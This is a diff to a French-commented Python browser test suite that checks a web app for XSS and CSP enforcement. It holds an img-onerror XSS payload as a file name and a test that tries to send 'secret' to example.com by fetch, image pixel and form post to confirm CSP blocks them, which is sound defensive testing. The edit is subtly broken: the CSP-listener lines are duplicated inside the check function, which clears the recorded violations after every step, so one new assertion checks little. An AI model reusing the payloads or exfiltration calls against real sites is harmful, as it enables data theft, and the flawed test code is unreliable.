@@ -59,6 +59,8 @@ FILE_NAME = "x<img src=x onerror=__xss('fname')>'\"&.csv"
 
 PROBE = r"""
 window.__xssHits = [];
+window.__csp = [];                       // la CSP de la page ne doit rien bloquer de l'app elle-même
+document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
 window.__xss = k => { window.__xssHits.push(String(k)); };
 window.__injected = () => {
   const bad = [];
@@ -84,7 +86,9 @@ STEPS = r"""
 (async (p1, p2) => {
   const report = [], errors = [];
   const pause = (ms = 60) => new Promise(r => setTimeout(r, ms));
-  const check = name => { const bad = window.__injected(); if (bad.length || window.__xssHits.length) report.push({ step: name, injected: [...new Set(bad)], hits: [...window.__xssHits] }); window.__xssHits = []; };
+  const check = name => { const bad = window.__injected(); if (bad.length || window.__xssHits.length) report.push({ step: name, injected: [...new Set(bad)], hits: [...window.__xssHits] }); window.__xssHits = [];
+window.__csp = [];                       // la CSP de la page ne doit rien bloquer de l'app elle-même
+document.addEventListener('securitypolicyviolation', e => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`)); };
   const step = async (name, fn) => { try { await fn(); await pause(); } catch (e) { errors.push(name + ': ' + (e && e.message || e)); } check(name); };
   const ev = { stopPropagation() {}, preventDefault() {}, target: document.body, currentTarget: document.body, clientX: 200, clientY: 200 };
   const input = (id, v) => { const el = document.getElementById(id); el.value = v; el.dispatchEvent(new Event('input', { bubbles: true })); };
@@ -121,7 +125,7 @@ STEPS = r"""
     document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await p; });
   await step('tooltips', async () => { hover(); });
   await step('welcome screen (recents)', async () => { renderWelcome(); await pause(400); });
-  return { report, errors };
+  return { report, errors, csp: [...new Set(window.__csp)] };
 })
 """
 
@@ -156,6 +160,24 @@ class XssTest(unittest.TestCase):
         self.assertEqual(res["report"], [], "du HTML actif venu des données :\n" + json.dumps(res["report"], indent=1, ensure_ascii=False))
         # Les étapes doivent avoir réellement tourné : une boîte qui lève ne prouve rien.
         self.assertEqual(res["errors"], [], "étapes qui ont échoué (rien n'a donc été vérifié pour elles) :\n" + "\n".join(res["errors"]))
+        self.assertEqual(res["csp"], [], "la politique de sécurité bloque une partie de l'app")
+
+    def test_page_cannot_send_data_elsewhere(self):
+        # Quoi qu'exécute la page, la CSP l'empêche d'envoyer à un autre serveur que le sien.
+        res = self.chrome.eval(r"""(async () => {
+          const blocked = [];
+          const seen = new Promise(r => document.addEventListener('securitypolicyviolation', e => { blocked.push(e.violatedDirective); if (blocked.length >= 3) r(); }));
+          try { await fetch('https://example.com/?k=secret'); blocked.push('fetch passed'); } catch (e) { }
+          new Image().src = 'https://example.com/pixel?k=secret';
+          const f = document.createElement('form'); f.action = 'https://example.com/'; f.method = 'post'; document.body.append(f);
+          try { f.submit(); } catch (e) { }
+          await Promise.race([seen, new Promise(r => setTimeout(r, 2000))]);
+          f.remove();
+          return { blocked, own: (await fetch('/api/ping')).ok };
+        })()""")
+        self.assertNotIn("fetch passed", res["blocked"])
+        self.assertTrue({"connect-src", "img-src", "form-action"} <= set(res["blocked"]), res)
+        self.assertTrue(res["own"])                  # le serveur local reste joignable
 
 
 if __name__ == "__main__":
